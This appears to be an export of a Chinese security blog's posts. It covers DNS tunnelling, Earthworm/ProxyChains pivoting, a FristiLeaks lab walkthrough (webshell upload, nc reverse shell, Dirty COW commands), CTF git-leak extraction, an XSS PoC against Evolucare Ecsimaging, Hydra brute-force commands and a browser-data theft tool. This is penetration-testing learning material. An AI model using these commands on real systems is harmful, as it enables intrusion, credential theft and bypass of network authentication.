<h1 id="各种工具的利用环境"><a href="#各种工具的利用环境" class="headerlink" title="各种工具的利用环境"></a>各种工具的利用环境</h1><h3 id="1-外-gt-内"><a href="#1-外-gt-内" class="headerlink" title="1.外-&gt;内"></a><strong>1.外-&gt;内</strong></h3><p>iodine和dnscat2使用环境：目标是内网，并且只有dns出网的情况下，通过自己的公网服务器搭建到目标的dns隧道，从而通过公网服务器代理进入目标内网，遨游目标内网。</p>
<p><img src="/2022/12/28/DNS%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/640" alt="图片"></p>
<h3 id><a href="#" class="headerlink" title></a></h3><h3 id="2-内-gt-外"><a href="#2-内-gt-外" class="headerlink" title="2.内-&gt;外"></a><strong>2.内-&gt;外</strong></h3><p>dns2tcp使用的环境是：自己在一个内网里面，自己所处的环境不出网，但是dns可以出网，就可以用过dns2tcp搭建一个dns隧道，从而可以访问到互联网环境。</p>
<p>典型环境：在学校连接到wifi之后，必须要认证登陆，不然不能上网，但是浏览器又能加载出登陆界面，此情况就是dns出网，可以通过dns2tcp搭建dns隧道绕过认证登陆。</p>
<p><img src="/2022/12/28/DNS%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/640" alt="图片"></p>
<p>（图是偷的外面的，有水印就别建议了）</p>
]]></content>
      <categories>
        <category>-basic</category>
      </categories>
  </entry>
  <entry>
    <title>Earthworm+ProxyChains实现socks代理渗透</title>
    <url>/2022/08/22/Earthworm-ProxyChains%E5%AE%9E%E7%8E%B0socks%E4%BB%A3%E7%90%86%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1 id="Earthworm-ProxyChains实现socks代理渗透"><a href="#Earthworm-ProxyChains实现socks代理渗透" class="headerlink" title="Earthworm+ProxyChains实现socks代理渗透"></a>Earthworm+ProxyChains实现socks代理渗透</h1><p>ProxyChains是Linux下的代理工具，kali已经安装，它可以使任何程序通过代理上网，允许TCP和DNS通过代理隧道，支持HTTP、SOCKS4和SOCKS5类型的代理服务器，并且可配置多个代理。</p>
<p>EW是一套便携式的网络穿透工具，具有SOCKS5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，而且适用于不同的操作系统。</p>
<h2 id="反弹socks5服务器"><a href="#反弹socks5服务器" class="headerlink" title="反弹socks5服务器"></a>反弹socks5服务器</h2><p>1）在kali上</p>
<p>在kali上运行：</p>
<p>./ew_linux_x64 -s rcsocks -l 1080 -e 1234</p>
<p>该命令的意思是在kali上添加一个转接隧道，把本地1080端口收到的代理请求转交给1234端口。</p>
<p><img src="/2022/08/22/Earthworm-ProxyChains%E5%AE%9E%E7%8E%B0socks%E4%BB%A3%E7%90%86%E6%B8%97%E9%80%8F/504b028c-f85b-4634-97dd-e4949d0d91a2202206173c3ea39f-2236-4098-a6ac-63c39fb13c281.jpg" alt="通过SOCKS代理渗透整个内网"></p>
<p>2）在web服务器上</p>
<p>我们刚才在win10已经使用xshell远程连接web服务器，运行：</p>
<p>./ew_linux_x64 -s rssocks -d 192.168.1.109 -e 1234</p>
<p>该命令的意思是在web服务器上启动SOCKS5服务，并反弹到IP地址为192.168.1.109（kali）的1234端口上。</p>
<p><img src="/2022/08/22/Earthworm-ProxyChains%E5%AE%9E%E7%8E%B0socks%E4%BB%A3%E7%90%86%E6%B8%97%E9%80%8F/1d160ac4-6ea8-4ded-815f-16bd3f95d36920220617a26f10dd-f213-45af-8164-b2e68b4489301.jpg" alt="通过SOCKS代理渗透整个内网"></p>
<p>3）配置proxychains.conf</p>
<p>现在就可以通过访问127.0.0.1:1080端口使用在右侧web服务器上架设的SOCKS5代理服务了。</p>
<p><img src="/2022/08/22/Earthworm-ProxyChains%E5%AE%9E%E7%8E%B0socks%E4%BB%A3%E7%90%86%E6%B8%97%E9%80%8F/f0fdc529-6f6a-4b3e-a39c-69c7939461d8202206178ef83bd2-3936-4719-a629-82447cc2e5391.jpg" alt="通过SOCKS代理渗透整个内网"></p>
<p>/etc/proxychains.conf修改内容如下，去掉dynamic_chain的注释，并且在最后的位置添加代理。</p>
<p><img src="/2022/08/22/Earthworm-ProxyChains%E5%AE%9E%E7%8E%B0socks%E4%BB%A3%E7%90%86%E6%B8%97%E9%80%8F/fb45d930-ad61-40a9-8163-4393bfc2427720220617dc916179-b43d-44d7-a4bd-62e79e63c7b21.jpg" alt="通过SOCKS代理渗透整个内网"></p>
<p><img src="/2022/08/22/Earthworm-ProxyChains%E5%AE%9E%E7%8E%B0socks%E4%BB%A3%E7%90%86%E6%B8%97%E9%80%8F/ec08eec2-a9d1-41b0-80ac-18a6128c309820220617b4192fa9-db6c-4ba1-81e5-efa9b55777e11.jpg" alt="通过SOCKS代理渗透整个内网"></p>
<p>4）测试代理服务器是否正常</p>
<p>cp /usr/lib/proxychains3/proxyresolv /usr/bin/</p>
<p>proxyresolv 192.168.223.166</p>
<p>发现代理正常，现在我们已经可以访问192.168.223.166了。</p>
<p><img src="/2022/08/22/Earthworm-ProxyChains%E5%AE%9E%E7%8E%B0socks%E4%BB%A3%E7%90%86%E6%B8%97%E9%80%8F/104ff069-a78c-42a7-9282-ef4e50a9e0f42022061708740834-ba9b-4622-b07a-caaa3681039c1.jpg" alt="通过SOCKS代理渗透整个内网"></p>
<h2 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h2><p>用proxychains可以启动任何程序，proxychains配合nmap和msf是内网渗透的大杀器，需要注意的是proxychains不支持udp和icmp协议。现在启动nmap，使用TCP扫描，不使用ping扫描，扫描整个内网，我们发现只能访问下面这台机器，对它进行扫描：</p>
<p><img src="/2022/08/22/Earthworm-ProxyChains%E5%AE%9E%E7%8E%B0socks%E4%BB%A3%E7%90%86%E6%B8%97%E9%80%8F/7d82c81e-0120-4aba-b41d-6989a122f2a5202206177a2f44ca-37b3-46c5-bc10-27a39ce737241.jpg" alt="通过SOCKS代理渗透整个内网"></p>
]]></content>
      <categories>
        <category>-tools</category>
      </categories>
  </entry>
  <entry>
    <title>FristiLeaks_1.3</title>
    <url>/2022/11/02/FristiLeaks-1-3/</url>
    <content><![CDATA[<h1 id="FristiLeaks-1-3"><a href="#FristiLeaks-1-3" class="headerlink" title="FristiLeaks_1.3"></a>FristiLeaks_1.3</h1><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><p>记得改nat模式。</p>
<p>nmap查看对方ip地址</p>
<p>改了nat之后，vm用户需要手动更改mac地址为</p>
<p>08:00:27:A5:A6:76</p>
<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102140304341.png" alt="image-20221102140304341"></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><code>nmap 192.168.100.0/24 -n -sP -sn</code></p>
<p>扫到目标地址为，192.168.100.168</p>
<p>然后还是扫端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.100.168</span><br></pre></td></tr></table></figure>

<p>只有一个80端口？</p>
<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102140812413.png" alt="image-20221102140812413"></p>
<p>是这么个东西</p>
<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102141214460.png" alt="image-20221102141214460"></p>
<p>刚刚扫到个robots先看看。</p>
<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102141315482.png" alt="image-20221102141315482"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Disallow: /cola</span><br><span class="line">Disallow: /sisi</span><br><span class="line">Disallow: /beer</span><br></pre></td></tr></table></figure>

<h1 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h1><p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102141938396.png" alt="image-20221102141938396"></p>
<p>还是扫一下目录把，目录也没扫到，看了攻略，是index中的</p>
<p>fristi有提示。</p>
<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102143115854.png" alt="image-20221102143115854"></p>
<p>拼接url进入如下页面。所以要注意各种微小的东西，这些都是靶场中的提示，和实战中并不一样。</p>
<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102143103409.png" alt="image-20221102143103409"></p>
<p>下面有个登录框，弱口令sql测试过了，没用。</p>
<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102143335952.png" alt="image-20221102143335952"></p>
<p>扫目录扫出来个no！</p>
<p>暂时还不知道干什么用的。</p>
<p>查看登录框界面的前端代码会发现注释，有一大串base64</p>
<p>解码之后发现是一个png</p>
<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102143558311.png" alt="image-20221102143558311"></p>
<p>将他在kali中解码为png文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base64 -d base64.txt &gt; base64.png</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102144626370.png" alt="image-20221102144626370"></p>
<p>得到密码为，keKkeKKeKKeKkEkkEk</p>
<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102144843878.png" alt="image-20221102144843878"></p>
<p>同时在html的注释中还有发信人的名字，</p>
<p>eezeepz</p>
<h1 id="漏洞利用-upload"><a href="#漏洞利用-upload" class="headerlink" title="漏洞利用-upload"></a>漏洞利用-upload</h1><p>成功登录！随后就是一个上传文件的目录，然后尝试上传冰蝎的木马</p>
<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102145147078.png" alt="image-20221102145147078"></p>
<p>害得来一个绕过，那我们就进行一个绕过。%00和00截断都用过了，应该是白名单，而且正常无法绕。但是这是一个Apache服务器，尝试寻找他的解析漏洞进行getshell。</p>
<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102150027246.png" alt="image-20221102150027246"></p>
<p>apache 2.2.15</p>
<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102150144080.png" alt="image-20221102150144080"></p>
<p>多文件名后缀的解析漏洞。</p>
<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102150222722.png" alt="image-20221102150222722"></p>
<p>解析成功，使用冰蝎连接。</p>
<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102150330655.png" alt="image-20221102150330655"></p>
<p>这是一个</p>
<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102150349992.png" alt="image-20221102150349992"></p>
<p>apache权限的用户，所以还需要进行一个提权。</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>先弹一个nc来我们的kali上面</p>
<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102150546777.png" alt="image-20221102150546777"></p>
<p>弹是弹回来了，但是输入一个字母就要出现两个字母，就很麻烦诶。</p>
<p>发现其中有个文件<code>checklogin.php</code></p>
<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102150634958.png" alt="image-20221102150634958"></p>
<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102150733991.png" alt="image-20221102150733991"></p>
<p>拿到mysql的账号密码，一下子就想到了udf提权。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eezeepz</span><br><span class="line">4ll3maal12#</span><br></pre></td></tr></table></figure>

<p>但是我记得udf提权是需要root的mysql用户，这就十分尴尬了。</p>
<p>随后想到了脏牛提权,上传我祖传的脏牛脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">./dirty 123456</span><br></pre></td></tr></table></figure>

<p>随后登录我们的firefart账户就可以了</p>
<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102153136131.png" alt="image-20221102153136131"></p>
<p>拿下权限</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个靶场相比前面的靶场难度有所提升，有些地方没想到却是还是借助了攻略。但是我记得某个大佬说过，这些靶场既然是靶场那就是存在漏洞的，那么作者最有可能的是在漏洞的隐藏上面下功夫，而不是在利用上面。所以以后我们必须要注重的是靶场中的一些细节，一定要做好，看好。</p>
]]></content>
      <categories>
        <category>-bachang</category>
      </categories>
  </entry>
  <entry>
    <title>Git与Git文件导致源码泄露</title>
    <url>/2022/01/01/Git%E4%B8%8EGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<h1 id="Git与Git文件导致源码泄露"><a href="#Git与Git文件导致源码泄露" class="headerlink" title="Git与Git文件导致源码泄露"></a>Git与Git文件导致源码泄露</h1><p>Git是目前世界上最先进的<strong>分布式版本控制系统</strong></p>
<p>git泄露是常见的ctf题型，来看几个例子</p>
<h2 id="Hello-World-i春秋-第二届春秋欢乐赛-web"><a href="#Hello-World-i春秋-第二届春秋欢乐赛-web" class="headerlink" title="Hello World (i春秋 第二届春秋欢乐赛 web)"></a>Hello World (i春秋 第二届春秋欢乐赛 web)</h2><p>这里只说git利用的点</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-615612ba7e3c7914.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/369/format/webp" alt="img"></p>
<p>由上可知有git泄露<br>之后尝试使用常用工具GitHack<br><a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a></p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-585b35b487c7a4d5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/693/format/webp" alt="img"></p>
<p>这里应该是通过.git/refs/heads/master中存储的commit的object来提取了master分支</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-c6ea2ef7681a2c38.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/414/format/webp" alt="img"></p>
<p>但是这并不够，因为本题的考点原意是.git/logs/HEAD文件的利用，而githack并没有对其中的hash提取，因此遗漏了部分的object，即下图中的部分hash</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-17011a2e0aa78d61.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1114/format/webp" alt="img"></p>
<p>这里使用JGitHack是可以获取到这些遗漏的object的</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-5f8dd5ec2fdeb41e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/666/format/webp" alt="img"></p>
<p>之后需要手动提取object<br>这里使用git的底层命令，cat-file和ls-tree<br>看一下logs中的提交记录</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-a2d083652835b1b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/846/format/webp" alt="img"></p>
<p>可以发现有两个commit，并且hash值是不一样的，说明有文件出现改动<br>于是这里手动查看一下</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-24acb3c8ce970283.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/675/format/webp" alt="img"></p>
<p>可见他们的tree的hash也是不一样的，说明其中有文件改变，这里继续看两个tree</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-0de1938ca18d91ac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/596/format/webp" alt="img"></p>
<p>由此可见其中的flag.js是变动了，他们的hash值不一样，说明文件不一样，分别是<br> f2b45f1e5af6dc1a8607c11e4ddc5fd077276c45<br> 04bb09bb63fe48e6cab3e1c72a7ef51dda9634b8<br> 所以flag应该就是在这其中<br> 之后可以使用git cat-file命令提取文件</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-ae203287f9ffafec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/586/format/webp" alt="img"></p>
<p>之后再sublime中diff一下这两个文件</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-c1ace39cda328b1d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/704/format/webp" alt="img"></p>
<p> 会发现有不同，很明显的区别就是flag了，这前三个差异的字符分别是f,l,a，再往后看便是flag了<br> 到这里，这题做完了，但是过程有些繁琐，而且是可以自动完成的<br> 原先我的想法是使用几个git命令自动完成这个，但发现效率有些低<br> 于是我写了这个工具<br> <a href="https://github.com/gakki429/Git_Extract">https://github.com/gakki429/Git_Extract</a><br> 我们试试这个工具</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-1c10b475d2b36001.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/576/format/webp" alt="img"></p>
<p>看下获取到的文件，与之前的对比</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-7d9201cc8bc9ac39.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/438/format/webp" alt="img"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-05a3a46139dab261.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/479/format/webp" alt="img"></p>
<p>之后直接diff其中的flag.js和f2b45f_flag.js就可以了</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-c691aff459782dd7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/723/format/webp" alt="img"></p>
<h2 id="登录-百度杯CTF比赛-十月场-web"><a href="#登录-百度杯CTF比赛-十月场-web" class="headerlink" title="登录 (百度杯CTF比赛 十月场 web)"></a>登录 (百度杯CTF比赛 十月场 web)</h2><p>前面是注入<br>最后可以得到用户<br>username: bctf3dm1n<br>password: adminqwe123666<br>登录之后如下</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-f0fde8b99202a2bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/503/format/webp" alt="img"></p>
<p>可见.bctfg1t，应该是git泄露<br>这题的主要考点是.git/refs/stash</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-40844349a4e2b466.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/943/format/webp" alt="img"></p>
<p>stash是一个用于保存git工作进度的文件<br>之后利用Git_Extract获取<br>这里获取了master分值，之后也解析了stash中的存的hash的object</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-4814b39438ff3f93.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/691/format/webp" alt="img"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-75dd391740af9970.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/481/format/webp" alt="img"></p>
<p>由此可获得提示信息</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-c03796b23bab5313.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/442/format/webp" alt="img"></p>
<p>之后打开这个71ec9d5ca5580c58d1872962c596ea71.php<br>就可以看到flag了</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-fdbd521dd90d9dc1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/754/format/webp" alt="img"></p>
<p>如果这里使用GitHack也是可以完成的</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-dff9e68d61d64e5a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/675/format/webp" alt="img"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-362526efaad7f461.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/447/format/webp" alt="img"></p>
<p>之后我们手动查看stash中的object就可以了</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-3faed573f040e3d0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/645/format/webp" alt="img"></p>
<p>从这个commit中的tree继续获取</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-12f63e9852ff8012.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/577/format/webp" alt="img"></p>
<h2 id="Backdoor-百度杯CTF比赛-十月场-web"><a href="#Backdoor-百度杯CTF比赛-十月场-web" class="headerlink" title="Backdoor (百度杯CTF比赛 十月场 web)"></a>Backdoor (百度杯CTF比赛 十月场 web)</h2><p>依旧是git的logs/HEAD，但是这里的commit有些多</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-f3a942027001d519.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/968/format/webp" alt="img"></p>
<p>使用Git_Extract会帮助你自动解析提取这些commit</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-22fc37de8cba7400.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/670/format/webp" alt="img"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-46d77de7b34ad8a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/579/format/webp" alt="img"></p>
<p>查看这几个flag文件可以发下如下提示，之后继续做就好了</p>
<p><img src="https://upload-images.jianshu.io/upload_images/5958785-dc18ada5dad0b203.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/448/format/webp" alt="img"></p>
<p>如果使用GitHack也可以完成，但是这些commit需要你手动提取，相当的难受</p>
<h4 id="Git常见的利用"><a href="#Git常见的利用" class="headerlink" title="Git常见的利用"></a>Git常见的利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.git/index中会缓存git add的文件，这里在没有commit的情况下，也是存在的</span><br><span class="line">https://github.com/lijiejie/GitHack lijiejie的这个就是获取的这个</span><br><span class="line">.git/refs/heads/master 记录了master的commit的hash，由此可以解析出这个commit的所有文件</span><br><span class="line">.git/logs/HEAD其中存储了git的log信息，可以找到历史的commit项</span><br><span class="line">.git/refs/stash 工作进度的临时保存</span><br><span class="line">最后说一个pack的问题，这个好像还没看见有ctf中考到，这里也做了恢复</span><br><span class="line">.git/info/packs packs文件提取恢复</span><br><span class="line"></span><br><span class="line">去除了原本的不存在文件的下载失败的提示</span><br><span class="line">增加对windows字体颜色输出的支持，并同步默认背景色，linux中背景色也修改为与默认同步</span><br><span class="line">更换了帅气的Logo（手动滑稽）</span><br><span class="line">觉得好用的话就给个star吧</span><br></pre></td></tr></table></figure>

<p>下载地址<br><a href="https://github.com/gakki429/Git_Extract">https://github.com/gakki429/Git_Extract</a></p>
<p>此文章为转载：<a href="https://www.jianshu.com/p/0ea09975169d">CTF中的几种git泄露 - 简书 (jianshu.com)</a></p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>Evolucare Ecsimaging new_movie.php反射性xss</title>
    <url>/2023/02/13/Evolucare-Ecsimaging-new-movie-php%E5%8F%8D%E5%B0%84%E6%80%A7xss/</url>
    <content><![CDATA[<h1 id="Evolucare-Ecsimaging-new-movie-php反射性xss"><a href="#Evolucare-Ecsimaging-new-movie-php反射性xss" class="headerlink" title="Evolucare Ecsimaging new_movie.php反射性xss"></a>Evolucare Ecsimaging new_movie.php反射性xss</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>EVOLUCARE ECSimage是一款国外使用的医疗管理系统，研究发现其new_movie.php接口中存在反射性xss，其源码中直接echo了输入的参数，攻击者可以通过此行为窃取系统用户中的cookie信息等。</p>
<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EVOLUCARE Evolucare Ecsimaging 版本&lt; 6.21.5</span><br></pre></td></tr></table></figure>

<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/new_movie.php?studyUID=1&amp;start=&lt;script&gt;alert(`xss`)&lt;/script&gt;&amp;end=2&amp;file=1</span><br></pre></td></tr></table></figure>

<h2 id="演示截图"><a href="#演示截图" class="headerlink" title="演示截图"></a>演示截图</h2><p><img src="/2023/02/13/Evolucare-Ecsimaging-new-movie-php%E5%8F%8D%E5%B0%84%E6%80%A7xss/image-20230213165854226.png" alt="image-20230213165854226"></p>
]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>Hydra工具  远程桌面 ssh ftp爆破</title>
    <url>/2022/08/21/Hydra%E5%B7%A5%E5%85%B7%20%20%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%20ssh%20ftp%E7%88%86%E7%A0%B4/</url>
    <content><![CDATA[<h1 id="Hydra工具-远程桌面爆破"><a href="#Hydra工具-远程桌面爆破" class="headerlink" title="Hydra工具  远程桌面爆破"></a>Hydra工具  远程桌面爆破</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）在kali中创建密码字典（存放位置可自定义）：</span><br><span class="line"></span><br><span class="line">命令：touch /home/kali/Desktop/password.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（2）编辑密码字典，存入数据：</span><br><span class="line"></span><br><span class="line">命令：vim  /home/kali/Desktop/password.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（3）查看待爆破主机IP（本实验使用Windows 11×64虚拟机）：</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（4）对特定用户名进行爆破：</span><br><span class="line"></span><br><span class="line">命令：hydra -l 15 -P /home/kali/Desktop/password.txt -V 192.168.32.128 rdp -t 4 -V</span><br></pre></td></tr></table></figure>

<p>用户名为15的位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（5）尝试在kali中使用爆破出来的密码登陆Win11的远程桌面：</span><br><span class="line"></span><br><span class="line">命令：rdesktop 192.168.32.128 </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra介绍：</span><br><span class="line"></span><br><span class="line">（1）Hydra 是著名黑客组织 thc 的一款开源的暴力密码破解工具，可以暴力破解多种密码。包括FTP 、 HTTP 的 所有协议、SQL 类的所有协议、 SOCKS5 、 SSH 、 Telnet 等几乎所有类型的协议都可以爆破。</span><br><span class="line">（2）这款暴力密码破解工具相当强大，支持几乎所有协议的在线密码破解，其密码能否被破解关键在于字典 是否足够强大。对于社会工程型渗透来说，有时能够得到事半功倍的效果。</span><br><span class="line">（3）参数选项：</span><br><span class="line">hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t</span><br><span class="line">TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x</span><br><span class="line">MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]</span><br><span class="line">通用： hydra &lt; 参数 &gt; &lt;IP 地址 &gt; &lt; 服务名 &gt;</span><br><span class="line">-R 继续从上一次进度接着破解。</span><br><span class="line">-S 采用 SSL 链接。</span><br><span class="line">-s PORT 可通过这个参数指定非默认端口。</span><br><span class="line">-l LOGIN 指定破解的用户，对特定用户破解。</span><br><span class="line">-L FILE 指定用户名字典。</span><br><span class="line">-p PASS 小写，指定密码破解，少用，一般是采用密码字典。</span><br><span class="line">-P FILE 大写，指定密码字典。</span><br><span class="line">-e ns 可选选项， n ：空密码试探， s ：使用指定用户和密码试探。</span><br><span class="line">-C FILE 使用冒号分割格式，例如 “ 登录名 : 密码 ” 来代替 -L/-P 参数。</span><br><span class="line">-M FILE 指定目标列表文件一行一条。</span><br><span class="line">-o FILE 指定结果输出文件。</span><br><span class="line">-f 在使用 -M 参数以后，找到第一对登录名或者密码的时候中止破解。</span><br><span class="line">-t TASKS 同时运行的线程数，默认为 16 。</span><br><span class="line">-w TIME 设置最大超时的时间，单位秒，默认是 30s 。</span><br><span class="line">-v / -V 显示详细过程。</span><br><span class="line">server 目标 ip</span><br><span class="line">service 指定服务名，支持的服务和协议： telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt</span><br><span class="line">http-&#123;head|get&#125; http-&#123;get|post&#125;-form http-proxy cisco cisco-enable vnc ldap2</span><br><span class="line">ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp</span><br><span class="line">rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd</span><br><span class="line">firebird ncp afp 等等。</span><br><span class="line">OPT 可选项</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt -t 2 -vV -e ns 192.168.124.10 ssh</span><br></pre></td></tr></table></figure>

<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV</span><br></pre></td></tr></table></figure>

<h2 id="teamspeak"><a href="#teamspeak" class="headerlink" title="teamspeak"></a>teamspeak</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak</span><br></pre></td></tr></table></figure>

<h2 id="pop3"><a href="#pop3" class="headerlink" title="pop3"></a>pop3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l muts -P pass.txt my.pop3.mail pop3</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-tools</category>
      </categories>
  </entry>
  <entry>
    <title>HackBrowserData_浏览器数据导出工具</title>
    <url>/2022/10/23/HackBrowserData-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%87%BA%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h1 id="HackBrowserData-浏览器数据导出工具"><a href="#HackBrowserData-浏览器数据导出工具" class="headerlink" title="HackBrowserData_浏览器数据导出工具"></a>HackBrowserData_浏览器数据导出工具</h1><p>项目地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/moonD4rk/HackBrowserData/blob/master/README_ZH.md</span><br></pre></td></tr></table></figure>

